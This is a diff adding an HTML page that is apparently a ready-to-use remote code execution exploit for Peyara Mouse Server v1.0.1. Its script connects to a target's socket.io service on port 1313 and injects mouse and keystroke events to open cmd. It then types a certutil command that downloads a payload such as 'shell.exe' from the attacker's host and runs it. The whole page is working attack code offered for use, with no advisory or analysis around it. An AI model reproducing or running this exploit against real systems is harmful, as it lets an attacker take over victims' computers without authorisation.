@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Peyara Mouse Server v1.0.1 RCE Exploit</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #121212;
+            color: #d4d4d4;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1 {
+            color: #ffb6c1; 
+            border-bottom: 1px solid #3e3e3e;
+            padding-bottom: 10px;
+            text-shadow: 0 0 5px rgba(255, 182, 193, 0.5);
+        }
+        .container {
+            background-color: #1e1e1e;
+            border: 1px solid #333;
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #9cdcfe;
+        }
+        
+        input {
+    width: 100%;
+    padding: 8px;
+    background-color: #2d2d2d;
+    border: 1px solid #444;
+    color: #d4d4d4;
+    border-radius: 3px;
+    transition: border-color 0.3s ease;  
+}
+
+ 
+input:hover,
+input:focus {
+    border: 1px solid #444 !important;  
+    outline: none !important;  
+}
+
+        
+        
+        
+        button {
+            background-color: #4e94ce;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            border-radius: 3px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #569cd6;
+        }
+        button:disabled {
+            background-color: #555;
+            cursor: not-allowed;
+        }
+        #output {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #121212;
+            border: 1px solid #333;
+            border-radius: 3px;
+            height: 150px;
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            white-space: pre;
+        }
+        .log-info {
+            color: #569cd6;
+        }
+        .log-success {
+            color: #6a9955;
+        }
+        .log-error {
+            color: #f44747;
+        }
+    </style>
+</head>
+<body>
+    <h1>Peyara Mouse Server v1.0.1 - Remote Code Execution</h1>
+    <div class="container">
+        <div class="input-group">
+            <label for="target">Target IP Address:</label>
+            <input type="text" id="target" placeholder="192.168.1.100">
+        </div>
+        <div class="input-group">
+            <label for="lhost">Your IP (LHOST):</label>
+            <input type="text" id="lhost" value="192.168.1.200">
+        </div>
+        <div class="input-group">
+            <label for="payload">Payload Filename:</label>
+            <input type="text" id="payload" value="shell.exe">
+        </div>
+        <button id="exploitBtn">Execute Exploit</button>
+        <div id="output"><div class="log-info">[System] Ready. Enter target IP and click Execute.</div></div>
+    </div>
+
+    <script>
+        const output = document.getElementById('output');
+        const exploitBtn = document.getElementById('exploitBtn');
+        let socket = null;
+
+        function log(message, type = 'info') {
+    const timestamp = new Date().toLocaleTimeString();
+    let colorClass = '';
+    
+    switch(type) {
+        case 'success':
+            colorClass = 'log-success';
+            break;
+        case 'error':
+            colorClass = 'log-error';
+            break;
+        default:
+            colorClass = 'log-info';
+    }
+    
+
+    const logEntry = document.createElement('div');
+    logEntry.className = colorClass;
+    logEntry.textContent = `[${timestamp}] ${message}`;
+    output.appendChild(logEntry);
+    output.scrollTop = output.scrollHeight;
+}
+
+        async function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        async function executeExploit() {
+            const targetIp = document.getElementById('target').value.trim();
+            const lhost = document.getElementById('lhost').value.trim();
+            const payload = document.getElementById('payload').value.trim();
+            
+            if (!targetIp) {
+                log("Error: Please enter target IP address", "error");
+                return;
+            }
+
+            const target = `http://${targetIp}:1313`;
+            exploitBtn.disabled = true;
+            log(`Initializing exploit against ${target}...`);
+            
+            try {
+                socket = io(target, {
+                    transports: ['websocket'],
+                    reconnection: false,
+                    timeout: 5000
+                });
+
+                socket.on('connect', async () => {
+                    log('Successfully connected to the server!');
+                    log('[*] Sending mouse movements');
+                    
+                    socket.emit('coordinates', {x: -9999, y: 9999});
+                    await sleep(100);
+                    socket.emit('coordinates', {x: 15, y: -10});
+                    await sleep(1000);
+                    
+                    log('[*] Triggering click');
+                    socket.emit('clicks', {finger: 'left', doubleTap: false});
+                    await sleep(1000);
+                    
+                    log('[*] Opening CMD');
+                    for (const key of ['c', 'm', 'd']) {
+                        socket.emit('key', key);
+                        await sleep(100);
+                    }
+                    
+                    await sleep(1000);
+                    socket.emit('key', 'Enter');
+                    log('[*] Executing payload');
+                    
+                    const curlCommand = `certutil -urlcache -split -f http://${lhost}/${payload} c:\\Windows\\Temp\\${payload} && c:\\Windows\\Temp\\${payload}`;
+                    await sleep(2000);
+                    
+                    for (const char of curlCommand) {
+                        socket.emit('key', char);
+                        await sleep(100);
+                    }
+                    
+                    await sleep(1000);
+                    socket.emit('key', 'Enter');
+                    await sleep(2000);
+                    
+                    log('[+] Payload executed - Disconnecting', 'success');
+                    socket.disconnect();
+                    exploitBtn.disabled = false;
+                });
+
+                socket.on('disconnect', () => {
+                    log('Disconnected from server');
+                });
+
+                socket.on('connect_error', (error) => {
+                    log(`Connection error: ${error.message}`, 'error');
+                    exploitBtn.disabled = false;
+                });
+
+            } catch (error) {
+                log(`Error: ${error.message}`, 'error');
+                exploitBtn.disabled = false;
+            }
+        }
+
+        exploitBtn.addEventListener('click', executeExploit);
+        
+        
+        document.getElementById('target').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                executeExploit();
+            }
+        });
+    </script>
+</body>
+</html>
